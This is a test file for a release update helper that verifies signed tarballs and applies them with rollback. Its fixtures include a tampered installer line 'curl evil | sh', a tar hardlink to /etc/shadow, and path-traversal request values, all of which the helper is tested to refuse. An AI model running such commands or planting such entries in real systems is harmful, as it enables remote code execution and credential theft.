import { createHash, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { chmod, lstat, mkdir, mkdtemp, readdir, readFile, realpath, rename, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { updateStatusFileSchema } from "@not-unreachable/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
// oxlint-disable-next-line no-restricted-imports -- the checks are one file, not a module with an index.ts.
import { signingKeyId, tarballName } from "../src/release-verify.mts";
// oxlint-disable-next-line no-restricted-imports -- the helper is one file, not a module with an index.ts.
import {
  APPLY_UNIT,
  healthCheckUrl,
  runUpdateHelper,
  UPDATE_EXIT_CODES,
  UPDATE_EXIT_REASONS,
  type RunOptions,
  type RunProgram,
  type UpdateHelperDependencies,
} from "../src/update-helper.mts";
import { releaseEntries, tarGz, type TarEntry } from "./tar-builder.ts";

const uid = process.getuid?.() ?? 0;
const gid = process.getgid?.() ?? 0;
const REQUEST_ID = "6f1c2b3a-4d5e-4f60-8a7b-9c0d1e2f3a4b";
const OLD_REQUEST_ID = "0b6e7a2c-4f1d-4c3e-9a8b-5d6c7e8f9a0b";
const FROM = "1.4.0";
const TO = "1.5.0";
const NOW = new Date("2026-11-25T14:02:11.000Z");

const { publicKey, privateKey } = generateKeyPairSync("ed25519");
const KEY_ID = signingKeyId(publicKey);
const stranger = generateKeyPairSync("ed25519");

interface Call {
  readonly file: string;
  readonly args: readonly string[];
  readonly options: RunOptions;
}

let root: string;
let calls: Call[];
let errors: string[];
let fetched: string[];
let dependencies: UpdateHelperDependencies;
// What the fake programs answer.
let applyUnitState: string;
let startCode: number;
let installerCode: number | null;
let oldInstallerCode: number | null;
let restartCodes: number[];
let restarts: number;
let onRestart: (restart: number) => Promise<void>;
let showFor: (restart: number) => string;
let healthStatus: number;
let free: number;

const requestDir = (): string => join(root, "requests");
const configFile = (): string => join(root, "config.env");
const stateDir = (): string => join(root, "state");
const workDir = (): string => join(stateDir(), "work");
const releaseDir = (): string => join(root, "opt");
const dataDir = (): string => join(root, "data");
const spool = (): string => join(dataDir(), "updates");
const database = (): string => join(dataDir(), "db", "not-unreachable.sqlite");
const backups = (): string => join(dataDir(), "backups");
const top = (version = TO, arch = "x64"): string => `not-unreachable-${version}-linux-${arch}`;

const STABLE = "ActiveState=active\nMainPID=4242\nNRestarts=0\n";

const fakeRun: RunProgram = async (file, args, options) => {
  calls.push({ file, args: [...args], options });
  if (file === "bash") {
    const installer = args[0] ?? "";
    return { code: installer.startsWith(releaseDir()) ? oldInstallerCode : installerCode, stdout: "" };
  }
  switch (args[0]) {
    case "is-active":
      return { code: applyUnitState === "active" ? 0 : 3, stdout: `${applyUnitState}\n` };
    case "start":
      return { code: startCode, stdout: "" };
    case "restart":
      restarts += 1;
      await onRestart(restarts);
      return { code: restartCodes.shift() ?? 0, stdout: "" };
    case "show":
      return { code: 0, stdout: showFor(restarts) };
    default:
      return { code: 0, stdout: "" };
  }
};

function config(lines: readonly string[] = []): string {
  return ["PUBLIC_ORIGIN=https://files.example.com", "UPDATE_FROM_UI=true", `DATA_DIR=${dataDir()}`, ...lines, ""].join("\n");
}

async function writeConfig(content: string, mode = 0o640): Promise<void> {
  await writeFile(configFile(), content);
  await chmod(configFile(), mode);
}

async function writeRequest(content: unknown = { requestId: REQUEST_ID, version: TO }, mode = 0o600): Promise<void> {
  const path = join(requestDir(), "update.json");
  await rm(path, { force: true });
  await writeFile(path, typeof content === "string" || content instanceof Buffer ? content : JSON.stringify(content));
  await chmod(path, mode);
}

function signatureLine(checksums: Buffer, key: KeyObject = privateKey, id = KEY_ID): string {
  return `ed25519 ${id} ${sign(null, checksums, key).toString("base64")}\n`;
}

/** Puts a release in the spool as the server leaves it: tarball, SHA256SUMS and its signature. */
async function spoolRelease({
  version = TO,
  entries = releaseEntries(top(version), version, "x64"),
  tarball = tarGz(entries),
  signature = (checksums: Buffer) => signatureLine(checksums),
}: {
  version?: string;
  entries?: TarEntry[];
  tarball?: Buffer;
  signature?: ((checksums: Buffer) => string) | undefined;
} = {}): Promise<void> {
  const name = tarballName(version, "x64");
  await writeFile(join(spool(), name), tarball);
  const checksums = Buffer.from(`${createHash("sha256").update(tarball).digest("hex")}  ${name}\n${"c".repeat(64)}  install.sh\n`);
  await writeFile(join(spool(), "SHA256SUMS"), checksums);
  if (signature !== undefined) await writeFile(join(spool(), "SHA256SUMS.sig"), signature(checksums));
}

async function exists(path: string): Promise<boolean> {
  return lstat(path).then(
    () => true,
    () => false,
  );
}

/** The status file, checked against the server's schema every time. */
async function status(): Promise<Record<string, unknown>> {
  const value: unknown = JSON.parse(await readFile(join(stateDir(), "status.json"), "utf8"));
  const parsed = updateStatusFileSchema.safeParse(value);
  expect(parsed.error).toBeUndefined();
  expect((await stat(join(stateDir(), "status.json"))).mode & 0o7777).toBe(0o644);
  if (typeof value !== "object" || value === null || Array.isArray(value)) throw new Error("the status is not an object");
  return Object.fromEntries(Object.entries(value));
}

async function writeStatus(fields: Record<string, unknown>): Promise<void> {
  const base = {
    schema: 1,
    requestId: OLD_REQUEST_ID,
    from: FROM,
    to: TO,
    phase: "finished",
    result: null,
    reason: null,
    signingKey: null,
    startedAt: NOW.toISOString(),
    updatedAt: NOW.toISOString(),
    finishedAt: null,
  };
  await writeFile(join(stateDir(), "status.json"), JSON.stringify({ ...base, ...fields }));
}

const verify = (): Promise<number> => runUpdateHelper(["verify"], dependencies);
const stagedInstaller = (): string => join(workDir(), REQUEST_ID, "staged", top(), "install.sh");
const apply = (): Promise<number> => runUpdateHelper(["apply"], dependencies);
const programs = (): string[] => calls.map((call) => [call.file, ...call.args].join(" "));

beforeEach(async () => {
  root = await realpath(await mkdtemp(join(tmpdir(), "update-helper-")));
  await mkdir(requestDir(), { mode: 0o700 });
  await mkdir(stateDir(), { mode: 0o755 });
  await mkdir(spool(), { recursive: true, mode: 0o700 });
  await mkdir(join(dataDir(), "db"), { recursive: true });
  await mkdir(backups());
  await writeFile(database(), "the database");
  const release = join(releaseDir(), FROM);
  await mkdir(join(release, "installer"), { recursive: true });
  await writeFile(join(release, "installer", "install.sh"), "#!/usr/bin/env bash\n");
  await writeFile(join(release, "VERSION"), `${FROM}\n`);
  await mkdir(join(release, "release-signing-keys"));
  await writeFile(join(release, "release-signing-keys", `${KEY_ID}.pem`), publicKey.export({ format: "pem", type: "spki" }));
  await symlink(FROM, join(releaseDir(), "current"));
  await writeConfig(config());
  await writeRequest();
  await spoolRelease();
  calls = [];
  errors = [];
  fetched = [];
  applyUnitState = "inactive";
  startCode = 0;
  installerCode = 0;
  oldInstallerCode = 0;
  restartCodes = [];
  restarts = 0;
  onRestart = async () => undefined;
  showFor = () => STABLE;
  healthStatus = 200;
  free = 10 * 1024 * 1024 * 1024;
  dependencies = {
    requestDir: requestDir(),
    configFile: configFile(),
    stateDir: stateDir(),
    releaseDir: releaseDir(),
    rootUid: uid,
    arch: "x64",
    serviceUser: async () => ({ uid, gid }),
    run: fakeRun,
    freeBytes: async () => free,
    fetch: async (url) => {
      fetched.push(url);
      return { status: healthStatus };
    },
    now: () => NOW,
    sleep: async () => undefined,
    writeError: (line) => errors.push(line),
  };
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

/** A refusal once the request is known: the status says so, and the work and lock are gone. */
async function expectRefused(code: number, reason: string, to = TO): Promise<void> {
  expect(await verify()).toBe(code);
  const written = await status();
  expect(written).toMatchObject({ requestId: REQUEST_ID, from: FROM, to, phase: "finished", result: "refused", reason });
  expect(written["finishedAt"]).toBe(NOW.toISOString());
  expect(await readdir(workDir())).toEqual([]);
  // Only a failed start tried to start the apply unit.
  expect(programs().includes(`systemctl start --no-block ${APPLY_UNIT}`)).toBe(code === UPDATE_EXIT_CODES.systemdFailed);
}

describe("the usage", () => {
  it.each([[[]], [["verify", "apply"]], [["install"]], [["VERIFY"]]])("refuses %j", async (argv) => {
    expect(await runUpdateHelper(argv, dependencies)).toBe(UPDATE_EXIT_CODES.usage);
    expect(calls).toEqual([]);
  });
});

describe("the exit codes", () => {
  it("map to the design's reasons", () => {
    expect(UPDATE_EXIT_REASONS[UPDATE_EXIT_CODES.spoolRefused]).toBe("download-incomplete");
    expect(UPDATE_EXIT_REASONS[UPDATE_EXIT_CODES.noSpace]).toBe("no-space");
    expect(
      Object.keys(UPDATE_EXIT_REASONS)
        .map(Number)
        .toSorted((a, b) => a - b),
    ).toEqual(
      Object.values(UPDATE_EXIT_CODES)
        .filter((code) => code !== 0)
        .toSorted((a, b) => a - b),
    );
  });
});

describe("verify", () => {
  it("copies the spool, verifies, stages the release and starts the apply unit", async () => {
    expect(await verify()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toEqual({
      schema: 1,
      requestId: REQUEST_ID,
      from: FROM,
      to: TO,
      phase: "verified",
      result: null,
      reason: null,
      signingKey: KEY_ID,
      startedAt: NOW.toISOString(),
      updatedAt: NOW.toISOString(),
      finishedAt: null,
    });
    const staged = join(workDir(), REQUEST_ID, "staged", top());
    expect(JSON.parse(await readFile(join(workDir(), "staged.json"), "utf8"))).toEqual({
      requestId: REQUEST_ID,
      from: FROM,
      to: TO,
      staged,
    });
    expect((await stat(join(staged, "install.sh"))).mode & 0o7777).toBe(0o755);
    expect(await readFile(join(workDir(), REQUEST_ID, "SHA256SUMS"), "utf8")).toContain("install.sh");
    expect(JSON.parse(await readFile(join(workDir(), "lock"), "utf8"))).toMatchObject({ requestId: REQUEST_ID });
    expect((await stat(workDir())).mode & 0o7777).toBe(0o700);
    expect(programs()).toEqual([`systemctl start --no-block ${APPLY_UNIT}`]);
  });

  it("refuses while the switch is off, leaving no lock and no status", async () => {
    await writeConfig(config(["UPDATE_FROM_UI=false"]));
    expect(await verify()).toBe(UPDATE_EXIT_CODES.switchOff);
    expect(await exists(join(workDir(), "lock"))).toBe(false);
    expect(await exists(join(stateDir(), "status.json"))).toBe(false);
    expect(calls).toEqual([]);
  });

  it.each(["", "UPDATE_FROM_UI=yes", "UPDATE_FROM_UI=TRUE", "# UPDATE_FROM_UI=true"])("reads %j as off", async (line) => {
    await writeConfig(["UPDATE_FROM_UI=false", line, `DATA_DIR=${dataDir()}`, ""].join("\n"));
    expect(await verify()).toBe(UPDATE_EXIT_CODES.switchOff);
  });

  it("refuses a config.env others may write", async () => {
    await writeConfig(config(), 0o660);
    expect(await verify()).toBe(UPDATE_EXIT_CODES.configRefused);
    expect(await exists(join(workDir(), "lock"))).toBe(false);
  });

  it("refuses a config.env that isn't root's", async () => {
    dependencies = { ...dependencies, rootUid: uid + 1 };
    expect(await verify()).toBe(UPDATE_EXIT_CODES.configRefused);
  });

  describe("the lock", () => {
    beforeEach(async () => {
      await mkdir(workDir(), { mode: 0o700 });
      await writeFile(join(workDir(), "lock"), JSON.stringify({ requestId: OLD_REQUEST_ID }));
      await mkdir(join(workDir(), OLD_REQUEST_ID));
    });

    it("is busy while the apply unit runs, and leaves everything as it is", async () => {
      applyUnitState = "active";
      await writeStatus({ phase: "installing" });
      expect(await verify()).toBe(UPDATE_EXIT_CODES.busy);
      expect(await exists(join(workDir(), "lock"))).toBe(true);
      expect(await exists(join(workDir(), OLD_REQUEST_ID))).toBe(true);
      expect((await status())["phase"]).toBe("installing");
    });

    it("is busy while the apply unit is starting", async () => {
      applyUnitState = "activating";
      await writeStatus({ phase: "verified" });
      expect(await verify()).toBe(UPDATE_EXIT_CODES.busy);
    });

    it.each(["installing", "restarting", "rolling-back"])("is interrupted when an update stopped while %s", async (phase) => {
      await writeStatus({ phase });
      expect(await verify()).toBe(UPDATE_EXIT_CODES.interrupted);
      expect(await exists(join(workDir(), "lock"))).toBe(true);
      expect((await status())["phase"]).toBe(phase);
    });

    it.each(["verifying", "verified"])("clears a stale lock and work left while %s, and goes on", async (phase) => {
      await writeStatus({ phase });
      expect(await verify()).toBe(UPDATE_EXIT_CODES.ok);
      expect(await exists(join(workDir(), OLD_REQUEST_ID))).toBe(false);
      expect((await status())["requestId"]).toBe(REQUEST_ID);
    });

    it("clears a lock with no status at all", async () => {
      expect(await verify()).toBe(UPDATE_EXIT_CODES.ok);
    });
  });

  it("is interrupted by a half-way status even without a lock", async () => {
    await writeStatus({ phase: "restarting" });
    expect(await verify()).toBe(UPDATE_EXIT_CODES.interrupted);
    expect(await exists(join(workDir(), "lock"))).toBe(false);
  });

  describe("the request", () => {
    it("is missing", async () => {
      await rm(join(requestDir(), "update.json"));
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestMissing);
      expect(await exists(join(stateDir(), "status.json"))).toBe(false);
      expect(await exists(join(workDir(), "lock"))).toBe(false);
    });

    it("has no folder", async () => {
      await rm(requestDir(), { recursive: true });
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestMissing);
    });

    it("is refused as a symlink", async () => {
      await writeFile(join(root, "elsewhere.json"), JSON.stringify({ requestId: REQUEST_ID, version: TO }));
      await chmod(join(root, "elsewhere.json"), 0o600);
      await rm(join(requestDir(), "update.json"));
      await symlink(join(root, "elsewhere.json"), join(requestDir(), "update.json"));
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestRefused);
    });

    it("is refused in a symlinked folder", async () => {
      await rm(requestDir(), { recursive: true });
      await mkdir(join(root, "other"));
      await symlink(join(root, "other"), requestDir());
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestRefused);
    });

    it.each([0o644, 0o640, 0o400])("is refused with mode %o", async (mode) => {
      await writeRequest(undefined, mode);
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestRefused);
    });

    it("is refused at 4 KiB, and taken just under", async () => {
      const json = JSON.stringify({ requestId: REQUEST_ID, version: TO });
      await writeRequest(json + " ".repeat(4096 - json.length));
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestRefused);
      await writeRequest(json + " ".repeat(4095 - json.length));
      expect(await verify()).toBe(UPDATE_EXIT_CODES.ok);
    });

    it.each<[string, unknown]>([
      ["not JSON", "{"],
      ["not UTF-8", Buffer.from([0x7b, 0xff, 0x7d])],
      ["an array", [REQUEST_ID, TO]],
      ["a missing version", { requestId: REQUEST_ID }],
      ["an unknown key", { requestId: REQUEST_ID, version: TO, url: "https://example.com/evil.tar.gz" }],
      ["an architecture", { requestId: REQUEST_ID, version: TO, arch: "arm64" }],
      ["an upper-case id", { requestId: REQUEST_ID.toUpperCase(), version: TO }],
      ["an id that climbs", { requestId: "../../etc", version: TO }],
      ["a numeric id", { requestId: 1, version: TO }],
      ["a v-prefixed version", { requestId: REQUEST_ID, version: `v${TO}` }],
      ["a path as version", { requestId: REQUEST_ID, version: "1.5.0/../../x" }],
    ])("is invalid with %s", async (_case, content) => {
      await writeRequest(content);
      expect(await verify()).toBe(UPDATE_EXIT_CODES.requestInvalid);
      expect(await exists(join(stateDir(), "status.json"))).toBe(false);
    });
  });

  describe("the spool", () => {
    it("is missing the tarball", async () => {
      await rm(join(spool(), tarballName(TO, "x64")));
      await expectRefused(UPDATE_EXIT_CODES.spoolMissing, "download-incomplete");
    });

    it("is missing SHA256SUMS", async () => {
      await rm(join(spool(), "SHA256SUMS"));
      await expectRefused(UPDATE_EXIT_CODES.spoolMissing, "download-incomplete");
    });

    it("has no folder", async () => {
      await rm(spool(), { recursive: true });
      await expectRefused(UPDATE_EXIT_CODES.spoolMissing, "download-incomplete");
    });

    it("is a symlink", async () => {
      await rm(spool(), { recursive: true });
      await mkdir(join(root, "elsewhere"));
      await symlink(join(root, "elsewhere"), spool());
      await expectRefused(UPDATE_EXIT_CODES.spoolRefused, "download-incomplete");
    });

    it("holds a symlinked tarball", async () => {
      const name = tarballName(TO, "x64");
      await writeFile(join(root, "elsewhere.tar.gz"), await readFile(join(spool(), name)));
      await rm(join(spool(), name));
      await symlink(join(root, "elsewhere.tar.gz"), join(spool(), name));
      await expectRefused(UPDATE_EXIT_CODES.spoolRefused, "download-incomplete");
    });

    it("holds a folder for a file", async () => {
      await rm(join(spool(), "SHA256SUMS.sig"));
      await mkdir(join(spool(), "SHA256SUMS.sig"));
      await expectRefused(UPDATE_EXIT_CODES.spoolRefused, "download-incomplete");
    });

    it("holds SHA256SUMS over 16 KiB", async () => {
      await writeFile(join(spool(), "SHA256SUMS"), Buffer.alloc(16 * 1024 + 1, 0x61));
      await expectRefused(UPDATE_EXIT_CODES.spoolRefused, "download-incomplete");
    });

    it("holds a signature over 4 KiB", async () => {
      await writeFile(join(spool(), "SHA256SUMS.sig"), Buffer.alloc(4097, 0x61));
      await expectRefused(UPDATE_EXIT_CODES.spoolRefused, "download-incomplete");
    });

    it("leaves too little room", async () => {
      free = 3 * (await stat(join(spool(), tarballName(TO, "x64")))).size - 1;
      await expectRefused(UPDATE_EXIT_CODES.noSpace, "no-space");
    });
  });

  describe("the signature", () => {
    it("is missing", async () => {
      await rm(join(spool(), "SHA256SUMS.sig"));
      await expectRefused(UPDATE_EXIT_CODES.unsigned, "unsigned");
    });

    it("is by a key current doesn't pin", async () => {
      await spoolRelease({ signature: (checksums) => signatureLine(checksums, stranger.privateKey, signingKeyId(stranger.publicKey)) });
      await expectRefused(UPDATE_EXIT_CODES.unsigned, "unsigned");
    });

    it("doesn't verify", async () => {
      await spoolRelease({ signature: (checksums) => signatureLine(checksums, stranger.privateKey) });
      await expectRefused(UPDATE_EXIT_CODES.signatureInvalid, "signature-invalid");
    });

    it("is malformed", async () => {
      await spoolRelease({ signature: () => "not a signature\n" });
      await expectRefused(UPDATE_EXIT_CODES.signatureInvalid, "signature-invalid");
    });
  });

  it("refuses a tarball that doesn't match SHA256SUMS, and records the key that signed it", async () => {
    await writeFile(
      join(spool(), tarballName(TO, "x64")),
      tarGz(releaseEntries(top(), TO, "x64", "#!/usr/bin/env bash\ncurl evil | sh\n")),
    );
    await expectRefused(UPDATE_EXIT_CODES.checksumMismatch, "checksum-mismatch");
    expect((await status())["signingKey"]).toBe(KEY_ID);
  });

  it("refuses a tarball whose VERSION isn't the signed name's", async () => {
    await spoolRelease({ entries: releaseEntries(top(), "1.5.1", "x64") });
    await expectRefused(UPDATE_EXIT_CODES.versionMismatch, "version-mismatch");
  });

  it("refuses a tarball whose ARCH isn't this host's", async () => {
    await spoolRelease({ entries: releaseEntries(top(), TO, "arm64") });
    await expectRefused(UPDATE_EXIT_CODES.versionMismatch, "version-mismatch");
  });

  it("refuses a replay of the release in use", async () => {
    await writeRequest({ requestId: REQUEST_ID, version: FROM });
    await spoolRelease({ version: FROM });
    await expectRefused(UPDATE_EXIT_CODES.notNewer, "not-newer", FROM);
  });

  it("refuses a downgrade to an older signed release", async () => {
    await writeRequest({ requestId: REQUEST_ID, version: "1.3.9" });
    await spoolRelease({ version: "1.3.9" });
    await expectRefused(UPDATE_EXIT_CODES.notNewer, "not-newer", "1.3.9");
  });

  it("refuses a pre-release of the release in use", async () => {
    await writeRequest({ requestId: REQUEST_ID, version: "1.4.0-rc.1" });
    await spoolRelease({ version: "1.4.0-rc.1" });
    await expectRefused(UPDATE_EXIT_CODES.notNewer, "not-newer", "1.4.0-rc.1");
  });

  it("needs the installer when current kept none", async () => {
    await rm(join(releaseDir(), FROM, "installer"), { recursive: true });
    await expectRefused(UPDATE_EXIT_CODES.needsInstaller, "needs-installer");
  });

  it("refuses an unsafe archive, even signed", async () => {
    await spoolRelease({
      entries: [...releaseEntries(top(), TO, "x64"), { name: `${top()}/shadow`, type: "hardlink", linkTarget: "/etc/shadow" }],
    });
    await expectRefused(UPDATE_EXIT_CODES.archiveUnsafe, "archive-unsafe");
  });

  it("refuses a signed file that isn't a gzip tar", async () => {
    await spoolRelease({ tarball: Buffer.from("not a tarball\n") });
    await expectRefused(UPDATE_EXIT_CODES.archiveInvalid, "archive-invalid");
  });

  it("refuses when the apply unit can't be started", async () => {
    startCode = 1;
    await expectRefused(UPDATE_EXIT_CODES.systemdFailed, "systemd-failed");
  });
});

describe("apply", () => {
  const BEFORE = "pre-migration-20250101T000000000Z.sqlite";
  const MADE = "pre-migration-20261125T140215000Z.sqlite";

  beforeEach(async () => {
    if ((await verify()) !== UPDATE_EXIT_CODES.ok) throw new Error(`verify failed: ${errors.join("; ")}`);
    calls = [];
    await writeFile(join(backups(), BEFORE), "a backup from last year");
    // The new release migrates at its first start: a pre-migration backup of the old database,
    // then the older ones go, as migrateDatabase does.
    onRestart = async (restart) => {
      if (restart !== 1) return;
      await writeFile(join(backups(), MADE), "the database");
      await rm(join(backups(), BEFORE));
      await writeFile(database(), "the migrated database");
      await writeFile(`${database()}-wal`, "wal");
      await writeFile(`${database()}-shm`, "shm");
    };
  });

  const oldInstaller = join("opt", FROM, "installer", "install.sh");

  it("installs, restarts, checks health and finishes as succeeded", async () => {
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({
      phase: "finished",
      result: "succeeded",
      reason: null,
      signingKey: KEY_ID,
      finishedAt: NOW.toISOString(),
    });
    expect(programs()).toEqual([
      `bash ${stagedInstaller()} --apply-update`,
      "systemctl restart not-unreachable.service",
      ...Array.from({ length: 7 }, () => "systemctl show -p ActiveState,MainPID,NRestarts not-unreachable.service"),
    ]);
    expect(calls[0]?.options).toMatchObject({ timeout: 600_000, cwd: join(workDir(), REQUEST_ID, "staged", top()) });
    expect(calls[1]?.options.timeout).toBe(300_000);
    expect(fetched).toEqual(["http://127.0.0.1:8480/api/v1/health"]);
    expect(await readdir(workDir())).toEqual([]);
    expect(await readFile(database(), "utf8")).toBe("the migrated database");
  });

  it("refuses with nothing changed when the switch went off", async () => {
    await writeConfig(config(["UPDATE_FROM_UI=false"]));
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "refused", reason: "switch-off" });
    expect(calls).toEqual([]);
  });

  it("refuses when the installer needs one run over SSH", async () => {
    installerCode = 3;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "refused", reason: "needs-installer" });
    expect(programs()).toEqual([`bash ${stagedInstaller()} --apply-update`]);
    expect(await readdir(workDir())).toEqual([]);
  });

  it("rolls back when the installer fails", async () => {
    installerCode = 1;
    // Only the old release starts, and it has nothing to migrate.
    onRestart = async () => undefined;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "rolled-back", reason: "installer-failed" });
    expect(programs().slice(0, 4)).toEqual([
      `bash ${stagedInstaller()} --apply-update`,
      "systemctl stop not-unreachable.service",
      `bash ${join(root, oldInstaller)} --apply-update`,
      "systemctl restart not-unreachable.service",
    ]);
    // The new release never started, so there is nothing to restore.
    expect(await readFile(database(), "utf8")).toBe("the database");
  });

  it("rolls back when the installer runs past its time", async () => {
    installerCode = null;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "rolled-back", reason: "installer-failed" });
  });

  it("rolls back when the new release doesn't start", async () => {
    restartCodes = [1];
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "rolled-back", reason: "start-failed" });
  });

  it("rolls back an unhealthy release and restores the database its start migrated", async () => {
    let pid = 100;
    showFor = (restart) => (restart === 1 ? `ActiveState=active\nMainPID=${(pid += 1)}\nNRestarts=1\n` : STABLE);
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ phase: "finished", result: "rolled-back", reason: "unhealthy" });
    expect(await readFile(database(), "utf8")).toBe("the database");
    expect((await stat(database())).mode & 0o7777).toBe(0o600);
    expect((await stat(database())).uid).toBe(uid);
    expect(await exists(`${database()}-wal`)).toBe(false);
    expect(await exists(`${database()}-shm`)).toBe(false);
    expect(await readdir(join(dataDir(), "db"))).toEqual(["not-unreachable.sqlite"]);
    const stop = programs().indexOf("systemctl stop not-unreachable.service");
    expect(stop).toBeGreaterThan(0);
    expect(programs()[stop + 1]).toBe(`bash ${join(root, oldInstaller)} --apply-update`);
  });

  it.each([
    ["the service leaves active", () => "ActiveState=failed\nMainPID=0\nNRestarts=0\n"],
    ["the service restarts", () => "ActiveState=active\nMainPID=4242\nNRestarts=3\n"],
  ])("is unhealthy when %s within the 30 seconds", async (_case, later) => {
    let shown = 0;
    showFor = (restart) => (restart === 1 && (shown += 1) > 1 ? later() : STABLE);
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "rolled-back", reason: "unhealthy" });
  });

  it("is unhealthy when /api/v1/health doesn't answer 200", async () => {
    healthStatus = 503;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    // The old release answers 503 too, so the rollback can't vouch for it either.
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "unhealthy" });
    expect(programs().at(-1)).toBe("systemctl stop not-unreachable.service");
  });

  it("asks over the loopback address the service listens on, with X-Forwarded-Proto", async () => {
    await writeConfig(config(["LISTEN_HOST=::1", "LISTEN_PORT=9000"]));
    const headers: Record<string, string>[] = [];
    dependencies = {
      ...dependencies,
      fetch: async (url, init) => {
        fetched.push(url);
        headers.push({ ...init.headers });
        expect(init.redirect).toBe("manual");
        return { status: 200 };
      },
    };
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(fetched).toEqual(["http://[::1]:9000/api/v1/health"]);
    expect(headers).toEqual([{ "X-Forwarded-Proto": "https" }]);
  });

  it("skips the health request when the service listens on a LAN address, and says so", async () => {
    await writeConfig(config(["LISTEN_HOST=192.168.1.5"]));
    healthStatus = 503;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "succeeded" });
    expect(fetched).toEqual([]);
    expect(errors.join("\n")).toMatch(/health request is skipped/u);
  });

  it("finishes as rollback-failed when the old release's installer fails too", async () => {
    installerCode = 1;
    oldInstallerCode = 1;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "installer-failed" });
    expect(programs().at(-1)).toBe("systemctl stop not-unreachable.service");
    expect(await readdir(workDir())).toEqual([]);
  });

  it("finishes as rollback-failed when the old release doesn't start", async () => {
    restartCodes = [0, 1];
    showFor = () => "ActiveState=activating\nMainPID=0\nNRestarts=0\n";
    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "unhealthy" });
  });

  it.each(["installing", "restarting", "rolling-back"])("recovers an update interrupted while %s", async (phase) => {
    // As a run that died half-way leaves it: its notes, a migrated database and its backup, the lock.
    await writeFile(join(workDir(), "apply.json"), JSON.stringify({ requestId: REQUEST_ID, dataDir: dataDir(), backupsBefore: [BEFORE] }));
    await writeFile(join(backups(), MADE), "the database");
    await writeFile(database(), "the migrated database");
    await writeStatus({ requestId: REQUEST_ID, phase, signingKey: KEY_ID });
    onRestart = async () => undefined;

    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({
      requestId: REQUEST_ID,
      phase: "finished",
      result: "interrupted",
      reason: "interrupted",
      signingKey: KEY_ID,
    });
    expect(programs().slice(0, 3)).toEqual([
      "systemctl stop not-unreachable.service",
      `bash ${join(root, oldInstaller)} --apply-update`,
      "systemctl restart not-unreachable.service",
    ]);
    expect(await readFile(database(), "utf8")).toBe("the database");
    expect(await readdir(workDir())).toEqual([]);
  });

  /** As a run that died half-way leaves it, with the new release's starts having made `made` and migrated the database. */
  async function interruptedWith(made: Record<string, string>): Promise<void> {
    await writeFile(join(workDir(), "apply.json"), JSON.stringify({ requestId: REQUEST_ID, dataDir: dataDir(), backupsBefore: [BEFORE] }));
    for (const [name, content] of Object.entries(made)) await writeFile(join(backups(), name), content);
    await writeFile(database(), "the migrated database");
    await writeStatus({ requestId: REQUEST_ID, phase: "installing", signingKey: KEY_ID });
    onRestart = async () => undefined;
  }

  it("restores the oldest backup made since, as a crash-looping release makes one at every start", async () => {
    // The first start backed up the old database; each later start backed up the migrated one.
    await interruptedWith({
      "pre-migration-20261125T140215000Z.sqlite": "the database",
      "pre-migration-20261125T140245000Z.sqlite": "the migrated database",
      "pre-migration-20261125T140315000Z.sqlite": "the migrated database again",
    });
    await writeFile(`${database()}-wal`, "wal");
    await writeFile(`${database()}-shm`, "shm");

    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "interrupted", reason: "interrupted" });
    expect(await readFile(database(), "utf8")).toBe("the database");
    expect(await readdir(join(dataDir(), "db"))).toEqual(["not-unreachable.sqlite"]);
    expect(errors).toContain("apply: restored the database from pre-migration-20261125T140215000Z.sqlite");
    expect((await stat(database())).mode & 0o777).toBe(0o600);
    // The backups stay, so the restore can run again.
    expect(await readdir(backups())).toHaveLength(4);
  });

  it("restores the same oldest backup when it runs again", async () => {
    await interruptedWith({ [MADE]: "the database", "pre-migration-20261125T140245000Z.sqlite": "the migrated database" });
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    await writeFile(database(), "the migrated database");
    await writeFile(join(workDir(), "apply.json"), JSON.stringify({ requestId: REQUEST_ID, dataDir: dataDir(), backupsBefore: [BEFORE] }));
    await writeStatus({ requestId: REQUEST_ID, phase: "rolling-back", signingKey: KEY_ID });
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await readFile(database(), "utf8")).toBe("the database");
  });

  it("says rollback-failed and leaves the database when backups is a symlink", async () => {
    await interruptedWith({});
    const elsewhere = join(root, "elsewhere");
    await rename(backups(), elsewhere);
    await writeFile(join(elsewhere, MADE), "the database");
    await symlink(elsewhere, backups());

    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "interrupted" });
